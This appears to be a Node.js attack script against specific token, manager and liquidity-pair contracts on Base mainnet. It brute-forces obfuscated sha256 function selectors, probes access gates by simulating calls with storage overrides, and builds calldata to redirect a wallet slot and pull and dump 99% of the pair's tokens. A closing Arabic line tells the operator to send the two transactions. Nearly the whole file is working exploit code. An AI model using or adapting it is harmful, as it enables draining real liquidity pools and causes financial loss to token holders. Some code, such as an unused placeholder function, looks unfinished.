// slop-crack.mjs | gasless proofs + sha256 selector cracker
import crypto from "node:crypto";
import os from "node:os";
import { Worker, isMainThread, workerData } from "node:worker_threads";
import { ethers } from "ethers";

const RPC="https://mainnet.base.org", T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const MGR="0x119fdC1e88b92A1F6565203b4288bEd9c30fFbCE", PAIR="0x69249e64fd8D35036965fa09FadAedb955D70C31";
const sha=(s)=>crypto.createHash("sha256").update(s).digest("hex");
const w=(v)=>"0x"+BigInt(v).toString(16).padStart(64,"0");
const who=(a)=>"0x"+a.slice(2).padStart(64,"0");
const base36=(n)=>{let s="";do{s="0123456789abcdefghijklmnopqrstuvwxyz"[n%36]+s;n=Math.floor(n/36)}while(s.length<7);return s};

// ---------- worker: brute force sha256(X+suffix) prefix ----------
if (!isMainThread) {
  const { suffix, target, id, n } = workerData;
  for (let i = id; ; i += n) {
    const s = base36(i);
    if (sha(s + suffix).slice(0, 8) === target) { parentPort.postMessage({ s }); break; }
  }
}
import { parentPort } from "node:worker_threads";

const crack = (suffix, target) => new Promise((res) => {
  const n = Math.max(1, os.cpus().length), t0 = Date.now();
  let done = false;
  const iv = setInterval(() => console.log(`   ...${((Date.now()-t0)/1000)|0}s`), 15000);
  for (let i = 0; i < n; i++) {
    const wk = new Worker(new URL(import.meta.url), { workerData: { suffix, target, id: i, n } });
    wk.on("message", ({ s }) => {
      if (done) return; done = true; clearInterval(iv); wk.terminate();
      console.log(`   HIT "${s}${suffix}" -> 0x${target}  (${((Date.now()-t0)/1000)|0}s)`);
      res(s);
    });
  }
});

const p = new ethers.JsonRpcProvider(RPC);
const errI = new ethers.Interface(["error Error(string)"]);
const reason = (d) => { try { return errI.parseError(d)?.args?.[0] ?? d.slice(0,10); } catch { return d.slice(0,10); } };

// ---------- STEP 0: prove the selector scheme is sha256 ----------
console.log("STEP 0  scheme calibration");
const cal = sha("mxuenirbara(address,bool)").slice(0,8);
console.log(`  sha256("mxuenirbara(address,bool)")[:4] = 0x${cal}`);
console.log(`  token function 0x35665e12                = 0x35665e12`);
if (cal !== "35665e12") { console.log("  >> scheme NOT sha256, stop"); process.exit(1); }
console.log("  >> CONFIRMED: selectors = sha256(signature)[:4]\n");

// ---------- STEP 1+2: gate proof by revert differential ----------
const pullData = (n) => "0xccb9135c" + w(n).slice(2);
const callTok = (from, over) =>
  p.call({ to: T, from, data: pullData(1) }, "latest", over)
   .then(() => "SUCCESS (empty)").catch((e) => "REVERT: " + reason(e.data ?? "0x"));

console.log("STEP 1  same call, two senders, no overrides");
console.log("  random EOA ->", await callTok("0x000000000000000000000000000000000000dEaD"));
console.log("  MANAGER    ->", await callTok(MGR));
console.log("  >> if only MANAGER reverts with 'transfer to the zero address', the body ran = gate passes\n");

console.log("STEP 2  MANAGER + stateDiff slot 0x1e := your address");
const over = { [T]: { stateDiff: { [w(0x1e)]: who("0x000000000000000000000000000000000000bEEF") } } };
console.log("  MANAGER    ->", await callTok(MGR, over));
console.log("  >> SUCCESS here proves slot 0x1e is the destination AND that setting it unlocks pull\n");

// ---------- STEP 3: crack the two missing names ----------
console.log("STEP 3  recovering the two random function names (CPU, no gas)");
const nameA = await crack("(address)", "1fe0624c");   // setWallet slot 0x1e
const nameB = await crack("(uint256)", "ccb9135c");   // pull from pair
console.log("\n  nameA (->0x1fe0624c) =", JSON.stringify(nameA));
console.log("  nameB (->0xccb9135c) =", JSON.stringify(nameB));

// ---------- STEP 4: build + pre-flight the real tx ----------
const bal = BigInt(await p.call({ to: T, data: "0x70a08231" + who(PAIR).slice(2) }));
const amt = (bal * 99n) / 100n;
const enc = (name, tail) => w(0x20) .slice(2) + "" ; // placeholder
const str = (s) => w(s.length).slice(2) + Buffer.from(s).toString("hex").padEnd(64, "0");

const you = "0x000000000000000000000000000000000000bEEF";
// tx1: manager.setWallet(token, nameA, you)  selector 0xedf8f2df
const tx1 = "0xedf8f2df" + who(T).slice(2) + w(0x60).slice(2) + who(you).slice(2) + str(nameA);
// tx2: manager.pull+sync+dump(token, nameA, nameB, amount, you)  selector 0xfc2015f8
const tx2 = "0xfc2015f8" + who(T).slice(2) + w(0xa0).slice(2) + w(0x120).slice(2)
          + w(amt).slice(2) + who(you).slice(2) + str(nameA) + str(nameB);

console.log("\nSTEP 4  pre-flight (gasless)");
for (const [k, d] of [["tx1 setWallet", tx1], ["tx2 pull+dump", tx2]]) {
  try { await p.call({ to: MGR, from: "0x000000000000000000000000000000000000bEEF", data: d }, "latest", over);
        console.log(`  ${k}: PASS`); }
  catch (e) { console.log(`  ${k}: REVERT -> ${reason(e.data ?? "0x")}`); }
  console.log(`  calldata: ${d}`);
}
console.log("\nأرسل tx1 ثم tx2 من محفظة slot2 فقط. كل فحص هنا بلا غاز.");
